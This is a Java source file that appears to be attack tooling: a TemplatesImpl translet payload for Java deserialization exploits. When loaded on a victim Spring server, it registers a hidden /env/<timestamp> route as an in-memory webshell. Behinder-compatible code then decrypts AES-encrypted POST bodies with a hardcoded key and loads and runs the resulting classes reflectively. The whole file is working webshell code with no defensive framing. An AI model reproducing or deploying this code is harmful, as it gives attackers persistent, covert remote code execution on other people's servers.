package com.sorry.utils.templatesimpl;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.Writer;
import java.lang.reflect.Method;

public class SpringController extends AbstractTranslet {
    public SpringController() throws IOException {
        org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
        try{
            Method method2 = SpringController.class.getMethod("Behinder");
            String path = "/env/"+System.currentTimeMillis();
            PatternsRequestCondition url = new PatternsRequestCondition(path);
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
            SpringController injectToController = new SpringController("interrupt");
            mappingHandlerMapping.registerMapping(info, injectToController, method2);
            Writer writer = httpresponse.getWriter();
            writer.write("path:"+url);
            writer.flush();
            writer.close();
        }catch (Exception e){
            Writer writer = httpresponse.getWriter();
            writer.write(getStackMsg(e));
            writer.flush();
            writer.close();
        }

    }
    public SpringController(String interrupt){
    }
    public void Behinder(){
        HttpServletRequest req = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();
        HttpServletResponse rsp = ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getResponse();
        try {
            rsp.setHeader("Path","MS17010");
            if (req.getMethod().equals("POST")) {
                String k = "aa623a8a2a34729b";
                req.getSession().setAttribute("u", k);
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(2, new javax.crypto.spec.SecretKeySpec(k.getBytes(), "AES"));
                java.util.Map<String, Object> pageContext = new java.util.HashMap<String, Object>();
                pageContext.put("session", req.getSession());
                pageContext.put("request", req);
                pageContext.put("response", rsp);
                java.io.BufferedReader bf = req.getReader();
                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));
                String sb = new String(evilClassBytes);
                Method defineclass= ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE,Integer.TYPE);
                defineclass.setAccessible(true);
                Class clazz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),evilClassBytes,0,evilClassBytes.length);
                Object a = clazz.newInstance();
                a.equals(pageContext);
                return;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private static String getStackMsg(Exception e) {
        StringBuffer sb = new StringBuffer();
        StackTraceElement[] stackArray = e.getStackTrace();
        for (int i = 0; i < stackArray.length; i++) {
            StackTraceElement element = stackArray[i];
            sb.append(element.toString() + "\n");
        }
        return sb.toString();
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
